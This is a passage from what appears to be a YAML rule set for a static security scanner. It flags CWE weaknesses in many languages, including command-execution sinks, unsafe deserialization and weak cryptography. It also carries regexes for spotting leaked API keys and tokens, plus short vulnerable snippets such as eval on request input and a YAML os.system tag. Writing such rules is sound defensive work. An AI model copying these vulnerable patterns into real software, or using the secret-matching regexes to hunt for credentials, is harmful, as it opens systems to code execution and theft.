message: 'CWE-120: Buffer Overflow via strcpy/strcat'
tags:
- security
- memory
- CWE-120
- CWE-119
rule:
  kind: call_expression
  has:
    any:
    - pattern: strcpy
    - pattern: strcat
    - pattern: wcscpy
    - pattern: wcscat
note: 'strcpy/strcat don''t check buffer bounds.

  Use strncpy/strncat with explicit size, or strlcpy/strlcat where available.

  '
---
id: c-cwe-134-format-string
language: c
severity: error
message: 'CWE-134: Format String Vulnerability'
tags:
- security
- format-string
- CWE-134
rule:
  kind: call_expression
  has:
    any:
    - pattern: printf
    - pattern: fprintf
    - pattern: sprintf
    - pattern: snprintf
    - pattern: syslog
note: 'Passing user input as format string can read/write arbitrary memory.

  Always use: printf("%s", user_input) not printf(user_input).

  '
---
id: c-cwe-120-sprintf
language: c
severity: error
message: 'CWE-120: Buffer Overflow via sprintf/vsprintf'
tags:
- security
- memory
- CWE-120
- CWE-119
rule:
  kind: call_expression
  has:
    any:
    - pattern: sprintf
    - pattern: vsprintf
note: 'sprintf/vsprintf don''t check buffer size.

  Use snprintf(buffer, sizeof(buffer), format, ...) instead.

  '
---
id: c-cwe-416-use-after-free
language: c
severity: error
message: 'CWE-416: Potential Use After Free'
tags:
- security
- memory
- CWE-416
rule:
  kind: call_expression
  has:
    pattern: free
note: 'After free(), the pointer should be set to NULL to prevent use-after-free.

  Pattern: free(ptr); ptr = NULL;

  '
---
id: cpp-cwe-401-new-delete
language: cpp
severity: warning
message: 'CWE-401: Memory Leak via raw new/delete'
tags:
- security
- memory
- CWE-401
rule:
  any:
  - pattern: 'new '
  - pattern: 'delete '
  - pattern: new[]
  - pattern: delete[]
note: 'Raw new/delete can lead to memory leaks and double-free.

  Use std::unique_ptr, std::shared_ptr, or std::make_unique.

  '
---
id: cpp-cwe-787-memcpy-unsafe
language: cpp
severity: warning
message: 'CWE-787: Out-of-bounds Write via memcpy/memmove'
tags:
- security
- memory
- CWE-787
- CWE-119
rule:
  kind: call_expression
  has:
    any:
    - pattern: memcpy
    - pattern: memmove
    - pattern: memset
note: 'memcpy/memmove/memset without proper size validation can cause overflow.

  Validate that size doesn''t exceed destination buffer capacity.

  '
---
id: swift-cwe-119-unsafe-pointer
language: swift
severity: warning
message: 'CWE-119: Unsafe pointer usage bypasses memory safety'
tags:
- security
- memory
- CWE-119
rule:
  any:
  - pattern: UnsafePointer
  - pattern: UnsafeMutablePointer
  - pattern: UnsafeRawPointer
  - pattern: UnsafeMutableRawPointer
  - pattern: UnsafeBufferPointer
  - pattern: UnsafeMutableBufferPointer
note: 'Unsafe pointer types bypass Swift''s memory safety.

  Ensure proper bounds checking; prefer safe alternatives when possible.

  '
---
id: swift-cwe-476-force-unwrap
language: swift
severity: warning
message: 'CWE-476: NULL Pointer Dereference via force unwrap (!)'
tags:
- security
- crash
- CWE-476
rule:
  pattern: $VAR!
note: 'Force unwrapping nil values crashes the application.

  Use optional binding (if let), guard let, or nil-coalescing (??).

  '
---
id: swift-cwe-295-url-session-insecure
language: swift
severity: warning
message: 'CWE-295: Insecure URLSession Configuration'
tags:
- security
- network
- CWE-295
rule:
  any:
  - pattern: URLSessionConfiguration.default
  - pattern: URLSession.shared
note: 'Ensure URLSession uses proper TLS configuration.

  Implement URLSessionDelegate for certificate pinning in sensitive apps.

  '
---
id: kotlin-cwe-89-sql-injection
language: kotlin
severity: error
message: 'CWE-89: SQL Injection via string template in query'
tags:
- security
- injection
- CWE-89
- OWASP-A03
rule:
  kind: call_expression
  has:
    kind: string_template_expression
note: 'String templates in SQL queries enable injection.

  Use parameterized queries with setParameter() or named parameters.

  '
---
id: kotlin-cwe-338-weak-random
language: kotlin
severity: warning
message: 'CWE-338: kotlin.random is not cryptographically secure'
tags:
- security
- crypto
- CWE-338
rule:
  any:
  - pattern: Random()
  - pattern: Random.nextInt
  - pattern: Math.random()
note: 'kotlin.random and Math.random() are predictable.

  Use java.security.SecureRandom() for cryptographic purposes.

  '
---
id: scala-cwe-78-process-execution
language: scala
severity: warning
message: 'CWE-78: Command Injection via scala.sys.process'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  any:
  - pattern: Process
  - pattern: .!
  - pattern: .!!
  - pattern: .run
  - pattern: stringToProcess
note: 'scala.sys.process executes shell commands with potential for injection.

  Validate user input; use ProcessBuilder with explicit arguments.

  '
---
id: scala-cwe-502-java-serialization
language: scala
severity: error
message: 'CWE-502: Java Serialization in Scala'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  any:
  - pattern: ObjectInputStream
  - pattern: readObject
note: 'Java serialization via ObjectInputStream can execute arbitrary code.

  Use JSON (circe, play-json) or Protocol Buffers instead.

  '
---
id: elixir-cwe-502-binary-to-term
language: elixir
severity: error
message: 'CWE-502: binary_to_term without :safe option'
tags:
- security
- deserialization
- CWE-502
- CWE-400
rule:
  any:
  - pattern: :erlang.binary_to_term
  - pattern: binary_to_term
  not:
    has:
      pattern: :safe
note: 'binary_to_term can create atoms (exhausting atom table) and execute code.

  Always use :erlang.binary_to_term(data, [:safe]) for untrusted data.

  '
---
id: elixir-cwe-94-code-eval
language: elixir
severity: error
message: 'CWE-94: Code Injection via Code.eval_*'
tags:
- security
- injection
- CWE-94
- OWASP-A03
rule:
  any:
  - pattern: Code.eval_string
  - pattern: Code.eval_quoted
  - pattern: Code.eval_file
  - pattern: Code.compile_string
note: 'Code.eval_* functions execute arbitrary Elixir code.

  Never use with user input; use pattern matching or safe parsing.

  '
---
id: elixir-cwe-400-atom-exhaustion
language: elixir
severity: warning
message: 'CWE-400: Denial of Service via Atom Table Exhaustion'
tags:
- security
- dos
- CWE-400
rule:
  any:
  - pattern: String.to_atom
  - pattern: List.to_atom
note: 'Atoms are never garbage collected. Converting user input to atoms

  can exhaust the atom table (default ~1M atoms), crashing the BEAM.

  Use String.to_existing_atom() or keep strings/binaries.

  '
---
id: haskell-cwe-676-unsafe-perform-io
language: haskell
severity: warning
message: 'CWE-676: unsafePerformIO breaks referential transparency'
tags:
- security
- unsafe
- CWE-676
rule:
  any:
  - pattern: unsafePerformIO
  - pattern: unsafeDupablePerformIO
  - pattern: unsafeInterleaveIO
  - pattern: unsafeCoerce
note: 'Unsafe functions break Haskell''s type system and purity guarantees.

  Document invariants carefully; prefer pure alternatives when possible.

  '
---
id: haskell-cwe-78-system-process
language: haskell
severity: warning
message: 'CWE-78: Command Injection via System.Process'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  any:
  - pattern: System.Process.system
  - pattern: callCommand
  - pattern: spawnCommand
  - pattern: readProcess
  - pattern: createProcess
note: 'System.Process functions execute shell commands.

  Use proc with explicit arguments to avoid shell interpretation.

  '
---
id: lua-cwe-94-loadstring
language: lua
severity: error
message: 'CWE-94: Code Injection via loadstring/load'
tags:
- security
- injection
- CWE-94
- OWASP-A03
rule:
  any:
  - pattern: loadstring
  - pattern: load
  - pattern: loadfile
  - pattern: dofile
note: 'These Lua functions compile and execute arbitrary code.

  Never use with untrusted input; use data serialization instead.

  '
---
id: lua-cwe-78-os-execute
language: lua
severity: warning
message: 'CWE-78: Command Injection via os.execute/io.popen'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  any:
  - pattern: os.execute
  - pattern: io.popen
note: 'os.execute and io.popen run shell commands with injection risk.

  Validate all user input; consider sandboxing Lua execution.

  '
---
id: groovy-cwe-94-eval
language: groovy
severity: error
message: 'CWE-94: Code Injection via Groovy evaluation'
tags:
- security
- injection
- CWE-94
- OWASP-A03
rule:
  any:
  - pattern: Eval.me
  - pattern: Eval.x
  - pattern: Eval.xy
  - pattern: GroovyShell.evaluate
  - pattern: GroovyShell.parse
  - pattern: GroovyClassLoader.parseClass
note: 'Groovy evaluation functions execute arbitrary code.

  Use SecureASTCustomizer with CompilerConfiguration to restrict capabilities.

  '
---
id: groovy-cwe-78-string-execute
language: groovy
severity: warning
message: 'CWE-78: Command Injection via String.execute()'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  pattern: .execute()
note: 'Groovy''s String.execute() runs commands in a shell.

  Validate all user input; use ProcessBuilder with explicit arguments.

  '
---
id: clojure-cwe-94-eval-read
language: clojure
severity: error
message: 'CWE-94/CWE-502: Code Injection via Clojure eval/read'
tags:
- security
- injection
- deserialization
- CWE-94
- CWE-502
- OWASP-A03
rule:
  any:
  - pattern: (eval
  - pattern: (load-string
  - pattern: (read-string
  - pattern: (load-file
note: 'eval and read-string can execute arbitrary Clojure code.

  Use clojure.edn/read-string for safe data parsing.

  '
---
id: dart-cwe-78-process-run
language: dart
severity: warning
message: 'CWE-78: Command Injection via Process.run'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  any:
  - pattern: Process.run
  - pattern: Process.start
  - pattern: Process.runSync
note: 'Process.run with user input can lead to command injection.

  Validate arguments; avoid shell: true when possible.

  '
---
id: r-cwe-78-system
language: r
severity: warning
message: 'CWE-78: Command Injection via system/shell'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  any:
  - pattern: system(
  - pattern: system2(
  - pattern: shell(
note: 'system() and shell() execute OS commands with injection risk.

  Validate all user input before passing to these functions.

  '
---
id: r-cwe-94-eval-parse
language: r
severity: error
message: 'CWE-94: Code Injection via eval(parse())'
tags:
- security
- injection
- CWE-94
- OWASP-A03
rule:
  any:
  - pattern: eval(parse(
  - pattern: source(
note: 'eval(parse(text=...)) and source() execute arbitrary R code.

  Never use with user input; validate file paths for source().

  '
---
id: julia-cwe-94-eval
language: julia
severity: error
message: 'CWE-94: Code Injection via Julia eval/Meta.parse'
tags:
- security
- injection
- CWE-94
- OWASP-A03
rule:
  any:
  - pattern: eval(
  - pattern: '@eval'
  - pattern: Meta.parse
  - pattern: include(
note: 'Julia''s eval and Meta.parse execute arbitrary code.

  Never use with user input; use data serialization formats.

  '
---
id: julia-cwe-78-run
language: julia
severity: warning
message: 'CWE-78: Command Injection via Julia run/read'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  any:
  - pattern: run(
  - pattern: read(
note: 'Julia''s run() and backtick commands execute shell commands.

  Use Cmd objects with separate arguments to avoid injection.

  '
---
id: universal-cwe-798-hardcoded-password
language: '*'
severity: error
message: 'CWE-798: Hardcoded Password or Credential'
tags:
- security
- credentials
- CWE-798
- OWASP-A07
rule:
  kind: assignment
  pattern: $VAR = $VALUE
  where:
    VAR:
      regex: (?i)^(password|passwd|pwd|secret|api_?key|auth_?token|bearer|private_?key|secret_?key|access_?key|client_?secret|encryption_?key|signing_?key|aws_?secret|database_?password|db_?password|admin_?password|root_?password|master_?password|credentials?)$
    VALUE:
      kind: string_literal
      regex: .{4,}
note: 'Hardcoded credentials in source code are a critical security risk.

  Use environment variables, secret managers (AWS Secrets Manager, HashiCorp Vault),

  or encrypted configuration files excluded from version control.

  '
---
id: universal-cwe-798-secret-patterns
language: '*'
severity: error
message: 'CWE-798: Detected Secret or API Key Pattern'
tags:
- security
- credentials
- CWE-798
- OWASP-A07
rule:
  kind: string_literal
  where:
    match:
      any:
      - regex: AKIA[0-9A-Z]{16}
      - regex: '[A-Za-z0-9/+=]{40}'
      - regex: eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*
      - regex: '-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----'
      - regex: sk-[a-zA-Z0-9]{32,}
      - regex: (pk|sk|rk)_(live|test)_[a-zA-Z0-9]{24,}
      - regex: ghp_[a-zA-Z0-9]{36}
      - regex: gho_[a-zA-Z0-9]{36}
      - regex: xox[baprs]-[0-9]{10,13}-[0-9]{10,13}(-[a-zA-Z0-9]{24})?
      - regex: AIza[0-9A-Za-z\-_]{35}
      - regex: SK[a-f0-9]{32}
      - regex: SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}
      - regex: '[a-f0-9]{32}-us[0-9]{1,2}'
      - regex: '[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27}'
note: 'High-entropy string matching known secret patterns detected.

  Remove secrets from source code; use secret management solutions.

  '
---
id: universal-cwe-327-weak-hash-md5
language: '*'
severity: error
message: 'CWE-327/CWE-328: MD5 is Cryptographically Broken'
tags:
- security
- crypto
- CWE-327
- CWE-328
- OWASP-A02
rule:
  any:
  - pattern: md5
  - pattern: MD5
  - pattern: Md5
  - pattern: MD5_
note: 'MD5 has known collision attacks and preimage resistance issues.

  Use SHA-256, SHA-3, or BLAKE2 for cryptographic hashing.

  For passwords, use bcrypt, scrypt, or Argon2.

  '
---
id: universal-cwe-327-weak-hash-sha1
language: '*'
severity: warning
message: 'CWE-327: SHA1 is Deprecated for Security'
tags:
- security
- crypto
- CWE-327
- CWE-328
rule:
  any:
  - pattern: sha1
  - pattern: SHA1
  - pattern: Sha1
  - pattern: SHA-1
note: 'SHA1 has demonstrated collision attacks (SHAttered).

  Use SHA-256 or SHA-3 for cryptographic purposes.

  '
---
id: universal-cwe-327-weak-cipher
language: '*'
severity: error
message: 'CWE-327: Weak or Broken Cryptographic Algorithm'
tags:
- security
- crypto
- CWE-327
- OWASP-A02
rule:
  any:
  - pattern: DES
  - pattern: 3DES
  - pattern: DESede
  - pattern: RC4
  - pattern: RC2
  - pattern: Blowfish
  - pattern: IDEA
note: 'DES (56-bit), 3DES, RC4, RC2, Blowfish are weak or broken.

  Use AES-256-GCM or ChaCha20-Poly1305 for symmetric encryption.

  '
---
id: universal-cwe-327-ecb-mode
language: '*'
severity: error
message: 'CWE-327: ECB Mode Leaks Patterns'
tags:
- security
- crypto
- CWE-327
- OWASP-A02
rule:
  any:
  - pattern: /ECB/
  - pattern: ECB
  - pattern: AES/ECB
  - pattern: DES/ECB
note: 'ECB (Electronic Codebook) mode encrypts identical blocks identically,

  leaking patterns. Use GCM, CBC with random IV, or CTR mode.

  '
---
id: universal-cwe-22-path-traversal
language: '*'
severity: error
message: 'CWE-22: Path Traversal Sequence in String'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01
rule:
  kind: string_literal
  where:
    match:
      regex: \.\.[\\/]|[\\/]\.\.
note: 'String contains path traversal sequences (../ or ..\).

  Never use user input containing ".." in file paths.

  Use path canonicalization and validate against allowed directories.

  '
---
id: universal-cwe-319-insecure-http
language: '*'
severity: warning
message: 'CWE-319: Cleartext Transmission (HTTP instead of HTTPS)'
tags:
- security
- network
- CWE-319
- OWASP-A02
rule:
  kind: string_literal
  where:
    match:
      regex: http://(?!localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)
note: 'HTTP transmits data in plaintext, vulnerable to interception.

  Use HTTPS for all production URLs. Exception: localhost/private IPs for development.

  '
---
id: universal-cwe-215-debug-enabled
language: '*'
severity: warning
message: 'CWE-215: Debug Mode Enabled'
tags:
- security
- info-disclosure
- CWE-215
rule:
  any:
  - pattern: DEBUG = True
  - pattern: DEBUG = true
  - pattern: DEBUG=True
  - pattern: DEBUG=true
  - pattern: 'debug: true'
  - pattern: debug = true
  - pattern: .setDebug(true)
  - pattern: 'debugMode: true'
  - pattern: debugMode = true
note: 'Debug mode in production exposes sensitive information (stack traces, config).

  Ensure DEBUG=False/false before deployment.

  '
---
id: universal-cwe-89-sql-keywords-concat
language: '*'
severity: error
message: 'CWE-89: SQL Keyword in String Concatenation'
tags:
- security
- injection
- CWE-89
- OWASP-A03
rule:
  kind: binary_expression
  has:
    kind: string_literal
    where:
      match:
        regex: (?i)(SELECT|INSERT|UPDATE|DELETE|DROP|TRUNCATE|EXEC|EXECUTE|UNION|ALTER|CREATE|GRANT|REVOKE)\s
note: 'SQL keywords in string concatenation suggest SQL injection risk.

  Use parameterized queries or prepared statements.

  '
---
id: universal-cwe-521-weak-password-length
language: '*'
severity: warning
message: 'CWE-521: Weak Password Length Requirement'
tags:
- security
- authentication
- CWE-521
rule:
  any:
  - pattern: len(password) >= 4
  - pattern: len(password) >= 5
  - pattern: len(password) >= 6
  - pattern: len(password) >= 7
  - pattern: password.length >= 4
  - pattern: password.length >= 5
  - pattern: password.length >= 6
  - pattern: password.length >= 7
  - pattern: password.Length >= 4
  - pattern: password.Length >= 5
  - pattern: password.Length >= 6
  - pattern: password.Length >= 7
  - pattern: 'minLength: 4'
  - pattern: 'minLength: 5'
  - pattern: 'minLength: 6'
  - pattern: 'minLength: 7'
note: 'NIST SP 800-63B recommends minimum 8 characters for passwords.

  Consider 12+ characters and checking against known breached passwords.

  '
---
id: universal-cwe-614-insecure-cookie
language: '*'
severity: warning
message: 'CWE-614: Cookie Without Secure Flag'
tags:
- security
- session
- CWE-614
- CWE-1004
- OWASP-A07
rule:
  any:
  - pattern: secure=False
  - pattern: 'secure: false'
  - pattern: Secure=false
  - pattern: httpOnly=False
  - pattern: httponly=False
  - pattern: HttpOnly=false
  - pattern: 'httpOnly: false'
note: 'Cookies should be configured securely:

  - Secure: Only sent over HTTPS

  - HttpOnly: Not accessible via JavaScript (prevents XSS theft)

  - SameSite=Strict or Lax: Prevents CSRF

  '
---
id: universal-cwe-400-unbounded-loop
language: '*'
severity: warning
message: 'CWE-400/CWE-835: Potential Denial of Service via Unbounded Loop'
tags:
- security
- dos
- CWE-400
- CWE-835
rule:
  any:
  - pattern: 'while True:'
  - pattern: while (true)
  - pattern: while(true)
  - pattern: for (;;)
  - pattern: loop {
  - pattern: 'while 1:'
  - pattern: while (1)
note: 'Unbounded loops without proper exit conditions can cause DoS.

  Ensure loops have termination conditions, iteration limits, or timeouts.

  '
---
id: universal-cwe-390-empty-catch
language: '*'
severity: warning
message: 'CWE-390: Empty Exception Handler'
tags:
- security
- error-handling
- CWE-390
- CWE-754
rule:
  kind: catch_clause
  not:
    has:
      any:
      - kind: expression_statement
      - kind: return_statement
      - kind: throw_statement
      - kind: call_expression
note: 'Empty catch blocks silently swallow exceptions, hiding errors and security
  issues.

  At minimum, log the exception. Consider re-throwing or handling appropriately.

  '
---
id: universal-cwe-117-log-injection
language: '*'
severity: warning
message: 'CWE-117: Potential Log Injection'
tags:
- security
- logging
- CWE-117
rule:
  kind: call_expression
  has:
    any:
    - pattern: logging.info
    - pattern: logging.debug
    - pattern: logging.warning
    - pattern: logging.error
    - pattern: logger.info
    - pattern: logger.debug
    - pattern: logger.warn
    - pattern: logger.error
    - pattern: console.log
    - pattern: console.error
    - pattern: log.info
    - pattern: log.debug
    - pattern: log.error
    - pattern: Log.Info
    - pattern: Log.Debug
    - pattern: Log.Error
note: 'User input in logs can be exploited for log injection (forged entries, log
  analysis evasion).

  Sanitize newlines (\n, \r) and control characters from user input before logging.

  '
---
id: universal-cwe-209-stack-trace-exposure
language: '*'
severity: warning
message: 'CWE-209: Error Information Exposure to Users'
tags:
- security
- info-disclosure
- CWE-209
rule:
  kind: call_expression
  has:
    any:
    - pattern: printStackTrace
    - pattern: traceback.print_exc
    - pattern: traceback.format_exc
    - pattern: .StackTrace
    - pattern: getStackTrace
    - pattern: e.getMessage
note: 'Exposing stack traces to users reveals implementation details.

  Log errors server-side with full details; show generic messages to users.

  '
---
id: universal-cwe-367-toctou
language: '*'
severity: warning
message: 'CWE-367: Time-of-Check to Time-of-Use (TOCTOU) Race Condition'
tags:
- security
- race-condition
- CWE-367
rule:
  kind: call_expression
  has:
    any:
    - pattern: os.path.exists
    - pattern: os.path.isfile
    - pattern: os.path.isdir
    - pattern: os.access
    - pattern: File.exists
    - pattern: File.Exists
    - pattern: File.exist?
    - pattern: file_exists
    - pattern: access(
    - pattern: stat(
note: 'Checking a condition and acting on it non-atomically creates race conditions.

  Perform the operation directly and handle errors, or use atomic operations.

  '
---
id: universal-cwe-601-open-redirect
language: '*'
severity: warning
message: 'CWE-601: Open Redirect Vulnerability'
tags:
- security
- redirect
- CWE-601
- OWASP-A01
rule:
  kind: call_expression
  has:
    any:
    - pattern: redirect
    - pattern: HttpResponseRedirect
    - pattern: RedirectResponse
    - pattern: response.sendRedirect
    - pattern: redirect_to
    - pattern: Response.Redirect
    - pattern: res.redirect
note: 'User-controlled redirect URLs enable phishing attacks.

  Validate redirect URLs against an allowlist of trusted domains,

  or use relative URLs only.

  '
---
id: universal-cwe-1333-regex-redos
language: '*'
severity: warning
message: 'CWE-1333: Potential ReDoS via User-Controlled Regex'
tags:
- security
- dos
- CWE-1333
rule:
  any:
  - pattern: new RegExp
  - pattern: Regex(
  - pattern: re.compile
  - pattern: Pattern.compile
  - pattern: Regexp.new
  - pattern: RegExp.new
note: 'User-provided regex patterns can cause catastrophic backtracking (ReDoS).

  Validate patterns; use regex engines with timeout support (RE2, rust regex).

  '
---
id: universal-cwe-347-jwt-weak-verification
language: '*'
severity: error
message: 'CWE-347: JWT Verification Disabled or ''none'' Algorithm'
tags:
- security
- authentication
- CWE-347
- OWASP-A07
rule:
  any:
  - pattern: algorithms=["none"]
  - pattern: algorithms=['none']
  - pattern: 'algorithms: [''none'']'
  - pattern: 'algorithm: "none"'
  - pattern: '"alg": "none"'
  - pattern: verify=False
  - pattern: verify_signature=False
  - pattern: 'verify: false'
note: 'JWT with ''none'' algorithm or disabled verification bypasses authentication.

  Always verify signatures; specify allowed algorithms explicitly (e.g., RS256, ES256).

  '
---
id: universal-cwe-312-cleartext-storage
language: '*'
severity: warning
message: 'CWE-312: Cleartext Storage of Sensitive Information'
tags:
- security
- storage
- CWE-312
- OWASP-A02
rule:
  any:
  - pattern: password +
  - pattern: password =
  - pattern: secret =
  - pattern: apiKey =
  - pattern: api_key =
note: 'Storing sensitive data in cleartext risks exposure.

  Encrypt sensitive data at rest; use secure credential storage.

  '
---
id: universal-cwe-311-missing-encryption
language: '*'
severity: info
message: 'CWE-311: Consider Encryption for Data Transmission/Storage'
tags:
- security
- crypto
- CWE-311
rule:
  any:
  - pattern: ftp://
  - pattern: telnet://
  - pattern: ldap://
note: 'FTP, Telnet, and plain LDAP transmit data unencrypted.

  Use SFTP/FTPS, SSH, and LDAPS respectively.

  '
---
id: universal-cwe-532-sensitive-log
language: '*'
severity: warning
message: 'CWE-532: Sensitive Information in Log Files'
tags:
- security
- logging
- CWE-532
- OWASP-A09
rule:
  kind: call_expression
  has:
    any:
    - pattern: password
    - pattern: token
    - pattern: secret
    - pattern: credential
    - pattern: api_key
note: 'Logging sensitive information (passwords, tokens) exposes secrets.

  Mask or redact sensitive values before logging.

  '
---
id: universal-cwe-200-sensitive-exposure
language: '*'
severity: info
message: 'CWE-200: Potential Sensitive Information in Code Comments'
tags:
- security
- info-disclosure
- CWE-200
rule:
  kind: comment
  where:
    match:
      regex: (?i)(password|secret|api.?key|token|credential|private.?key)\s*[:=]?\s*['"][^'"]{4,}
note: 'Comments containing secrets can be exposed in source code repositories.

  Remove secrets from comments; use secret management solutions.

  '
---
id: python-cwe-94-eval-usage
language: python
severity: error
message: 'CWE-94: eval() executes arbitrary Python code from a string, enabling code
  injection attacks'
tags:
- security
- code-injection
- CWE-94
- OWASP-A03-2021-Injection
rule:
  kind: call
  pattern: eval($EXPR)
note: "The eval() function executes arbitrary Python code from a string. If the input\
  \ is user-controlled,\nattackers can execute malicious code leading to complete\
  \ system compromise.\n\nBad Example:\n  user_input = request.args.get('expr')\n\
  \  result = eval(user_input)  # Dangerous!\n\nFix: Use ast.literal_eval() for safe\
  \ parsing of literals, or avoid dynamic code execution entirely.\nReferences: https://semgrep.dev/docs/cheat-sheets/python-code-injection\n"
---
id: python-cwe-94-exec-usage
language: python
severity: error
message: 'CWE-94: exec() executes arbitrary Python statements, enabling code injection'
tags:
- security
- code-injection
- CWE-94
- OWASP-A03-2021-Injection
rule:
  kind: call
  pattern: exec($EXPR)
note: "exec() executes arbitrary Python statements. In Python 3, it's a built-in function\
  \ that can\nexecute any code, potentially leading to remote code execution.\n\n\
  Bad Example:\n  code = request.form['code']\n  exec(code)  # Remote Code Execution!\n\
  \nFix: Never use exec() with non-literal values. Strip everything except alphanumeric\
  \ characters if unavoidable.\n"
---
id: python-cwe-94-compile-usage
language: python
severity: warning
message: 'CWE-94: compile() can prepare code for eval() or exec() if source is user-controlled'
tags:
- security
- code-injection
- CWE-94
rule:
  kind: call
  pattern: compile($SOURCE, $FILENAME, $MODE)
note: 'compile() can be used to prepare code for eval() or exec(). If source is user-controlled,

  it enables code injection attacks.


  Fix: Only use with trusted, hardcoded source strings.

  '
---
id: python-cwe-94-globals-getitem
language: python
severity: error
message: 'CWE-94: Using dynamic keys to access globals() allows arbitrary code execution'
tags:
- security
- code-injection
- CWE-94
rule:
  kind: subscript
  pattern: globals()[$KEY]
note: 'Using non-static data to retrieve values from globals() allows attackers to
  access or

  execute arbitrary code through dynamic symbol table access.


  Fix: Use explicit attribute access instead of dynamic lookups.

  '
---
id: python-cwe-94-locals-getitem
language: python
severity: warning
message: 'CWE-94: Using dynamic keys to access locals() can expose internal state'
tags:
- security
- code-injection
- CWE-94
rule:
  kind: subscript
  pattern: locals()[$KEY]
note: 'Dynamic access to local symbol table can expose internal state or enable injection
  attacks.


  Fix: Use explicit variable access.

  '
---
id: python-cwe-94-getattr-dynamic
language: python
severity: warning
message: 'CWE-94: Dynamic attribute access with user input can access private methods'
tags:
- security
- code-injection
- CWE-94
rule:
  kind: call
  pattern: getattr($OBJ, $ATTR)
note: 'Dynamic attribute access with user-controlled attribute names can access private
  methods

  or trigger unexpected behavior.


  Fix: Validate attribute name against an allowlist before using getattr().

  '
---
id: python-cwe-94-setattr-dynamic
language: python
severity: warning
message: 'CWE-94: Setting attributes dynamically can modify object behavior unexpectedly'
tags:
- security
- code-injection
- CWE-94
rule:
  kind: call
  pattern: setattr($OBJ, $ATTR, $VAL)
note: 'Setting attributes dynamically with user-controlled attribute names can modify
  object

  behavior unexpectedly, potentially leading to security issues.


  Fix: Validate attribute name against an allowlist before using setattr().

  '
---
id: python-cwe-502-pickle-load
language: python
severity: error
message: 'CWE-502: pickle.load/loads() can execute arbitrary code during deserialization'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08-2021-Software-Integrity-Failures
rule:
  kind: call
  pattern: pickle.load($FILE)
note: "Pickle can execute arbitrary code during deserialization via __reduce__. Attackers\
  \ craft\nmalicious pickles to achieve Remote Code Execution (RCE).\n\nBad Example:\n\
  \  import pickle\n  data = request.files['data'].read()\n  obj = pickle.loads(data)\
  \  # RCE vulnerability!\n\nFix: Never unpickle untrusted data. Use JSON, MessagePack,\
  \ or Protocol Buffers for\nuntrusted sources.\n\nReferences: https://intoli.com/blog/dangerous-pickles/\n\
  \            https://snyk.io/articles/python-pickle-poisoning-and-backdooring-pth-files/\n"
---
id: python-cwe-502-pickle-loads
language: python
severity: error
message: 'CWE-502: pickle.loads() can execute arbitrary code during deserialization'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08-2021-Software-Integrity-Failures
rule:
  kind: call
  pattern: pickle.loads($DATA)
note: 'pickle.loads() deserializes data from a string/bytes and can execute arbitrary
  code.

  Never use with untrusted data.


  Fix: Use JSON or other safe serialization formats for untrusted sources.

  '
---
id: python-cwe-502-cpickle-load
language: python
severity: error
message: 'CWE-502: cPickle.load/loads() has identical RCE vulnerabilities as pickle'
tags:
- security
- deserialization
- CWE-502
rule:
  kind: call
  pattern: cPickle.load($FILE)
note: 'cPickle is the C-optimized version of pickle with identical vulnerabilities.


  Fix: Same as pickle - never use with untrusted data. Use safe alternatives like
  JSON.

  '
---
id: python-cwe-502-cpickle-loads
language: python
severity: error
message: 'CWE-502: cPickle.loads() has identical RCE vulnerabilities as pickle'
tags:
- security
- deserialization
- CWE-502
rule:
  kind: call
  pattern: cPickle.loads($DATA)
note: 'cPickle.loads() deserializes with RCE vulnerability.


  Fix: Never use with untrusted data.

  '
---
id: python-cwe-502-shelve-open
language: python
severity: warning
message: 'CWE-502: shelve.open() uses pickle internally and is vulnerable to RCE'
tags:
- security
- deserialization
- CWE-502
rule:
  kind: call
  pattern: shelve.open($PATH)
note: 'shelve uses pickle internally and is vulnerable to the same attacks as pickle.


  Fix: Don''t use shelve with untrusted data sources.

  '
---
id: python-cwe-502-yaml-load-unsafe
language: python
severity: error
message: 'CWE-502: yaml.load() without SafeLoader can instantiate arbitrary Python
  objects'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08-2021-Software-Integrity-Failures
rule:
  kind: call
  pattern: yaml.load($DATA)
note: "PyYAML's yaml.load() without SafeLoader can instantiate arbitrary Python objects\
  \ via\nspecial YAML tags like !!python/object/apply:os.system, enabling RCE.\n\n\
  Bad Example:\n  import yaml\n  config = yaml.load(user_input)  # RCE via !!python/object\
  \ tags\n\nFix: Always use yaml.safe_load() or yaml.load(data, Loader=yaml.SafeLoader).\n\
  References: https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization\n"
---
id: python-cwe-502-yaml-unsafe-load
language: python
severity: error
message: 'CWE-502: yaml.unsafe_load() explicitly allows arbitrary object instantiation'
tags:
- security
- deserialization
- CWE-502
rule:
  kind: call
  pattern: yaml.unsafe_load($DATA)
note: 'yaml.unsafe_load() explicitly allows arbitrary Python object instantiation.


  Fix: Use yaml.safe_load() instead.

  '
---
id: python-cwe-502-yaml-full-load
language: python
severity: warning
message: 'CWE-502: yaml.full_load() was vulnerable until PyYAML 5.4'
tags:
- security
- deserialization
- CWE-502
rule:
  kind: call
  pattern: yaml.full_load($DATA)
note: 'FullLoader was vulnerable until PyYAML 5.4. Using it risks deserialization
  attacks.


  Fix: Use yaml.safe_load() for untrusted data.

  '
---
id: python-cwe-502-marshal-loads
language: python
severity: warning
message: 'CWE-502: marshal.loads() is not intended to be secure against malicious
  data'
tags:
- security
- deserialization
- CWE-502
rule:
  kind: call
  pattern: marshal.loads($DATA)
note: 'marshal module is not intended to be secure against erroneous or maliciously
  constructed data.


  Fix: Use JSON for data interchange.

  '
---
id: python-cwe-502-dill-loads
language: python
